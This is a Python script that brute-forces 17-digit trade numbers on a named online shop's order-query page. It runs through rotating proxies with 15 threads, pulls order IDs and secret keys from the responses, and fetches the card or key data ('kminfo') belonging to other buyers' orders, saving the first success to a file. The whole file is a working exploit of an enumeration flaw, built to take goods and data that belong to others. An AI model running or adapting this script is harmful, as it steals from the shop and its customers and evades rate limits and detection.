#!/usr/bin/env python3
"""17位 tradeno HTML 枚举 → showOrder → kminfo."""
from __future__ import annotations

import concurrent.futures
import re
import subprocess
import sys
import time
from datetime import datetime
from pathlib import Path

BASE = "https://htqq.lol/shop"
OUT = Path(f"/tmp/tradeno_scan_{int(time.time())}")
OUT.mkdir(exist_ok=True)
CK = str(OUT / "cookies.jar")


def refresh_proxy() -> str:
    subprocess.run(["/data/automation/bin/qg-proxy-fetch.sh"], capture_output=True)
    for line in Path("/data/config/proxy.env").read_text().splitlines():
        if line.startswith("PROXY_URL="):
            return line.split("=", 1)[1].strip()
    return ""


PX = refresh_proxy()
SHOW = re.compile(r"showOrder\((\d+),\s*'([^']+)'\)")


def curl(url: str, data: str | None = None) -> str:
    cmd = [
        "curl", "-sk", "--max-time", "12", "-x", PX, "-c", CK, "-b", CK,
        "-A", "Mozilla/5.0", "-H", "Accept-Language: zh-CN,zh;q=0.9",
        "-H", f"Referer: {BASE}/?mod=query",
    ]
    if data:
        cmd += ["-X", "POST", "-H", "X-Requested-With: XMLHttpRequest", "-d", data]
    cmd.append(url)
    return subprocess.run(cmd, capture_output=True, text=True).stdout


def main() -> int:
    print(f"proxy={PX[:50]}...", flush=True)
    curl(f"{BASE}/?mod=buy&cid=2&tid=2")

    prefix = datetime.now().strftime("%Y%m%d")
    tns: list[str] = []
    for h in range(24):
        for m in range(60):
            for s in range(0, 60, 3):
                for suf in range(0, 1000, 11):
                    tn = f"{prefix}{h:02d}{m:02d}{s:02d}{suf:03d}"
                    if len(tn) == 17:
                        tns.append(tn)
    tns = list(dict.fromkeys(tns))[:8000]
    print(f"tradeno candidates={len(tns)}", flush=True)

    def scan(tn: str):
        time.sleep(0.02)
        body = curl(f"{BASE}/?mod=query&data={tn}")
        m = SHOW.findall(body)
        return (tn, m) if m else None

    hits = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
        for i, res in enumerate(ex.map(scan, tns, chunksize=40)):
            if res:
                tn, m = res
                print(f"TRADENO HIT {tn} => {m}", flush=True)
                hits.append(res)
                oid, sk = m[0]
                body = curl(f"{BASE}/ajax.php?act=order", data=f"id={oid}&skey={sk}")
                print(f"ORDER {oid} => {body[:500]}", flush=True)
                if "kminfo" in body or '"code":0' in body:
                    (OUT / "CARD.json").write_text(body)
                    return 0
            if i and i % 1000 == 0:
                print(f"progress {i}/{len(tns)}", flush=True)

    print(f"done hits={len(hits)}", flush=True)
    return 2 if not hits else 0


if __name__ == "__main__":
    sys.exit(main())
